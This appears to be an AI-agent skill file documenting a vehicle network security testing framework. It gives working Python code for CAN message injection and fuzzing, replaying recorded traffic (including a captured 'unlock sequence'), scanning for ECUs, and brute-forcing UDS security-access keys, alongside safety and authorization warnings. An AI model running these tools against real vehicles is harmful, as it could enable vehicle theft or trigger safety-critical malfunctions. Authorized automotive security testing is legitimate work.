---
name: s800-vehicle-network-security-testing
description: Security testing framework for automotive vehicle networks (CAN, LIN, FlexRay) with fuzzing, replay attacks, and diagnostic capabilities
triggers:
  - test vehicle network security
  - perform CAN bus fuzzing
  - analyze automotive network traffic
  - S800 security testing framework
  - vehicle network penetration testing
  - automotive CAN bus security
  - test vehicle ECU security
  - fuzzing automotive protocols
---

# S800 Vehicle Network Security Testing Framework

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

S800 is a security testing framework designed for automotive vehicle networks including CAN (Controller Area Network), LIN (Local Interconnect Network), and FlexRay protocols. It provides tools for penetration testing, fuzzing, traffic analysis, and security assessment of vehicle electronic control units (ECUs) and automotive networks.

**Key Capabilities:**
- CAN bus message injection and sniffing
- Protocol fuzzing for automotive networks
- Replay attack simulation
- Diagnostic service testing (UDS/KWP2000)
- Traffic analysis and logging
- ECU security assessment

## Installation

### Prerequisites

- Python 3.7+
- SocketCAN support (Linux) or compatible CAN interface
- Hardware: CAN adapter (e.g., PCAN-USB, Kvaser, SocketCAN device)

### Basic Setup

```bash
# Clone the repository
git clone https://github.com/zhu-zhu666/S800-Vehicle-Network-Security-Testing-Framework.git
cd S800-Vehicle-Network-Security-Testing-Framework

# Install dependencies
pip install -r requirements.txt

# Or install specific packages
pip install python-can cantools isotp pyserial
```

### Hardware Configuration

```bash
# Configure SocketCAN interface (Linux)
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Verify interface
ip -details link show can0
```

## Core Components

### 1. CAN Bus Communication

**Basic CAN Message Sending:**

```python
import can

# Initialize CAN bus
bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Send a CAN message
msg = can.Message(
    arbitration_id=0x123,
    data=[0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88],
    is_extended_id=False
)
bus.send(msg)

# Receive messages
for msg in bus:
    print(f"ID: 0x{msg.arbitration_id:03X} Data: {msg.data.hex()}")
    if msg.arbitration_id == 0x200:
        break
```

**CAN Message Sniffing:**

```python
import can
import time

def sniff_can_traffic(interface='can0', duration=10):
    """Capture CAN traffic for analysis"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    messages = []
    
    start_time = time.time()
    while time.time() - start_time < duration:
        msg = bus.recv(timeout=1.0)
        if msg:
            messages.append({
                'timestamp': msg.timestamp,
                'id': msg.arbitration_id,
                'data': msg.data.hex(),
                'dlc': msg.dlc
            })
            print(f"[{msg.timestamp:.3f}] ID: 0x{msg.arbitration_id:03X} Data: {msg.data.hex()}")
    
    bus.shutdown()
    return messages
```

### 2. Protocol Fuzzing

**CAN Message Fuzzer:**

```python
import can
import random
import time

class CANFuzzer:
    def __init__(self, interface='can0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    def fuzz_random_data(self, arbitration_id, count=100, delay=0.1):
        """Send random data to a specific CAN ID"""
        print(f"Fuzzing CAN ID 0x{arbitration_id:03X} with {count} messages")
        
        for i in range(count):
            # Generate random 8-byte payload
            data = [random.randint(0, 255) for _ in range(8)]
            msg = can.Message(
                arbitration_id=arbitration_id,
                data=data,
                is_extended_id=False
            )
            
            try:
                self.bus.send(msg)
                print(f"[{i+1}] Sent: {bytes(data).hex()}")
                time.sleep(delay)
            except can.CanError as e:
                print(f"Error sending message: {e}")
    
    def fuzz_bit_flip(self, arbitration_id, base_data, iterations=50):
        """Flip individual bits in base data"""
        for i in range(iterations):
            data = list(base_data)
            # Flip a random bit
            byte_pos = random.randint(0, len(data)-1)
            bit_pos = random.randint(0, 7)
            data[byte_pos] ^= (1 << bit_pos)
            
            msg = can.Message(arbitration_id=arbitration_id, data=data)
            self.bus.send(msg)
            time.sleep(0.05)
    
    def close(self):
        self.bus.shutdown()

# Usage
fuzzer = CANFuzzer('can0')
fuzzer.fuzz_random_data(0x7DF, count=50)  # OBD diagnostic ID
fuzzer.close()
```

### 3. Replay Attacks

**Traffic Recording and Replay:**

```python
import can
import pickle
import time

class CANReplay:
    def __init__(self, interface='can0'):
        self.interface = interface
    
    def record_traffic(self, filename, duration=30):
        """Record CAN traffic to file"""
        bus = can.interface.Bus(channel=self.interface, bustype='socketcan')
        messages = []
        
        print(f"Recording traffic for {duration} seconds...")
        start_time = time.time()
        base_time = None
        
        while time.time() - start_time < duration:
            msg = bus.recv(timeout=1.0)
            if msg:
                if base_time is None:
                    base_time = msg.timestamp
                
                messages.append({
                    'timestamp': msg.timestamp - base_time,
                    'id': msg.arbitration_id,
                    'data': list(msg.data),
                    'is_extended': msg.is_extended_id
                })
        
        bus.shutdown()
        
        with open(filename, 'wb') as f:
            pickle.dump(messages, f)
        
        print(f"Recorded {len(messages)} messages to {filename}")
    
    def replay_traffic(self, filename, speed=1.0):
        """Replay recorded CAN traffic"""
        bus = can.interface.Bus(channel=self.interface, bustype='socketcan')
        
        with open(filename, 'rb') as f:
            messages = pickle.load(f)
        
        print(f"Replaying {len(messages)} messages at {speed}x speed")
        start_time = time.time()
        
        for msg_data in messages:
            # Wait for the correct timing
            target_time = msg_data['timestamp'] / speed
            while time.time() - start_time < target_time:
                time.sleep(0.001)
            
            msg = can.Message(
                arbitration_id=msg_data['id'],
                data=msg_data['data'],
                is_extended_id=msg_data['is_extended']
            )
            bus.send(msg)
        
        bus.shutdown()
        print("Replay completed")

# Usage
replay = CANReplay('can0')
replay.record_traffic('unlock_sequence.pkl', duration=10)
replay.replay_traffic('unlock_sequence.pkl', speed=1.0)
```

### 4. UDS Diagnostic Testing

**UDS (Unified Diagnostic Services) Scanner:**

```python
import can
import isotp

class UDSScanner:
    def __init__(self, interface='can0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    def scan_ecu_addresses(self, start=0x700, end=0x7FF):
        """Scan for responsive ECU addresses"""
        responsive_ecus = []
        
        for addr in range(start, end + 1):
            # Send diagnostic session control request (0x10 0x01)
            msg = can.Message(
                arbitration_id=addr,
                data=[0x02, 0x10, 0x01],  # Length, Service, Session
                is_extended_id=False
            )
            
            self.bus.send(msg)
            
            # Wait for response (usually addr + 8)
            response = self.bus.recv(timeout=0.5)
            if response and response.arbitration_id == addr + 8:
                print(f"Found ECU at 0x{addr:03X}, responds at 0x{response.arbitration_id:03X}")
                responsive_ecus.append(addr)
        
        return responsive_ecus
    
    def read_dtc(self, ecu_addr):
        """Read Diagnostic Trouble Codes"""
        # Service 0x19 - Read DTC Information
        msg = can.Message(
            arbitration_id=ecu_addr,
            data=[0x02, 0x19, 0x02],  # Report DTC by status mask
            is_extended_id=False
        )
        self.bus.send(msg)
        
        response = self.bus.recv(timeout=1.0)
        if response:
            return response.data
        return None
    
    def close(self):
        self.bus.shutdown()

# Usage
scanner = UDSScanner('can0')
ecus = scanner.scan_ecu_addresses(0x700, 0x750)
for ecu in ecus:
    dtc = scanner.read_dtc(ecu)
    print(f"ECU 0x{ecu:03X} DTCs: {dtc.hex() if dtc else 'None'}")
scanner.close()
```

### 5. Security Assessment Tools

**Seed-Key Security Bypass Tester:**

```python
import can
import itertools

class SecurityAccessTester:
    def __init__(self, interface='can0', ecu_addr=0x7E0):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.ecu_addr = ecu_addr
    
    def request_seed(self, level=0x01):
        """Request security seed (Service 0x27)"""
        msg = can.Message(
            arbitration_id=self.ecu_addr,
            data=[0x02, 0x27, level],
            is_extended_id=False
        )
        self.bus.send(msg)
        
        response = self.bus.recv(timeout=1.0)
        if response and len(response.data) >= 3:
            # Extract seed from response
            seed = response.data[3:7]  # Typically 4 bytes
            return seed
        return None
    
    def send_key(self, key, level=0x02):
        """Send security key (Service 0x27)"""
        data = [0x02 + len(key), 0x27, level] + list(key)
        msg = can.Message(
            arbitration_id=self.ecu_addr,
            data=data,
            is_extended_id=False
        )
        self.bus.send(msg)
        
        response = self.bus.recv(timeout=1.0)
        return response
    
    def brute_force_key(self, seed, max_attempts=1000):
        """Attempt simple key brute force (for testing only)"""
        print(f"Seed: {seed.hex()}")
        
        for attempt in range(max_attempts):
            # Simple incremental key generation
            key = attempt.to_bytes(4, 'big')
            response = self.send_key(key)
            
            if response and response.data[1] == 0x67:  # Positive response
                print(f"Key found: {key.hex()}")
                return key
        
        return None
    
    def close(self):
        self.bus.shutdown()
```

## Configuration

### Environment Variables

```bash
# Set CAN interface
export CAN_INTERFACE=can0

# Set CAN bitrate
export CAN_BITRATE=500000

# Logging level
export S800_LOG_LEVEL=DEBUG

# Output directory for logs
export S800_OUTPUT_DIR=./test_results
```

### Configuration File Example

```python
# config.py
CONFIG = {
    'can_interface': 'can0',
    'bitrate': 500000,
    'protocols': ['CAN', 'UDS'],
    'target_ecus': [0x7E0, 0x7E1, 0x7E8],
    'fuzzing': {
        'iterations': 1000,
        'delay': 0.1,
        'random_seed': 42
    },
    'security': {
        'max_unlock_attempts': 3,
        'timeout': 5.0
    }
}
```

## Common Patterns

### Pattern 1: Security Assessment Workflow

```python
import can
from s800_utils import CANFuzzer, UDSScanner, SecurityAccessTester

def full_security_assessment(interface='can0'):
    """Complete vehicle network security assessment"""
    
    # Step 1: Scan for ECUs
    print("=== ECU Discovery ===")
    scanner = UDSScanner(interface)
    ecus = scanner.scan_ecu_addresses(0x700, 0x7FF)
    scanner.close()
    
    # Step 2: Test each ECU
    for ecu in ecus:
        print(f"\n=== Testing ECU 0x{ecu:03X} ===")
        
        # Fuzz the ECU
        fuzzer = CANFuzzer(interface)
        fuzzer.fuzz_random_data(ecu, count=50, delay=0.1)
        fuzzer.close()
        
        # Test security access
        sec_tester = SecurityAccessTester(interface, ecu)
        seed = sec_tester.request_seed()
        if seed:
            print(f"Seed obtained: {seed.hex()}")
        sec_tester.close()
    
    print("\n=== Assessment Complete ===")
```

### Pattern 2: Traffic Analysis

```python
import can
from collections import defaultdict

def analyze_can_traffic(interface='can0', duration=60):
    """Analyze CAN traffic patterns"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    message_counts = defaultdict(int)
    unique_data = defaultdict(set)
    
    import time
    start = time.time()
    
    while time.time() - start < duration:
        msg = bus.recv(timeout=1.0)
        if msg:
            message_counts[msg.arbitration_id] += 1
            unique_data[msg.arbitration_id].add(msg.data.hex())
    
    # Generate report
    print("\n=== Traffic Analysis Report ===")
    for can_id in sorted(message_counts.keys()):
        print(f"ID 0x{can_id:03X}: {message_counts[can_id]} messages, "
              f"{len(unique_data[can_id])} unique payloads")
    
    bus.shutdown()
    return message_counts, unique_data
```

## Troubleshooting

### Issue: Cannot Connect to CAN Interface

```bash
# Check interface status
ip link show can0

# Bring up interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Check for errors
dmesg | grep can
```

### Issue: Permission Denied

```bash
# Add user to dialout group (for USB adapters)
sudo usermod -a -G dialout $USER

# Or run with sudo (not recommended for production)
sudo python3 test_script.py
```

### Issue: Bus-Off State

```python
import can
import subprocess

def recover_can_bus(interface='can0'):
    """Recover CAN bus from bus-off state"""
    subprocess.run(['sudo', 'ip', 'link', 'set', 'down', interface])
    subprocess.run(['sudo', 'ip', 'link', 'set', 'up', interface])
    print(f"{interface} reset complete")
```

### Issue: Message Timing Issues

```python
# Use precise timing for critical operations
import time

def send_with_precise_timing(bus, messages, interval=0.01):
    """Send messages with precise timing"""
    for msg in messages:
        start = time.perf_counter()
        bus.send(msg)
        
        # Compensate for send time
        elapsed = time.perf_counter() - start
        sleep_time = max(0, interval - elapsed)
        time.sleep(sleep_time)
```

## Safety Warnings

⚠️ **Critical Safety Information:**

- Only test on isolated networks or test benches
- Never test on vehicles in operation or on public roads
- Automotive systems control safety-critical functions
- Unauthorized testing may be illegal in your jurisdiction
- Always obtain proper authorization before testing
- Disconnect safety-critical systems during testing

## Best Practices

1. **Always log all activities** for audit trails
2. **Use isolated test environments** to prevent unintended consequences
3. **Validate CAN bitrate** before sending messages
4. **Implement rate limiting** to avoid bus flooding
5. **Monitor for error frames** during fuzzing
6. **Keep backup configurations** of target systems
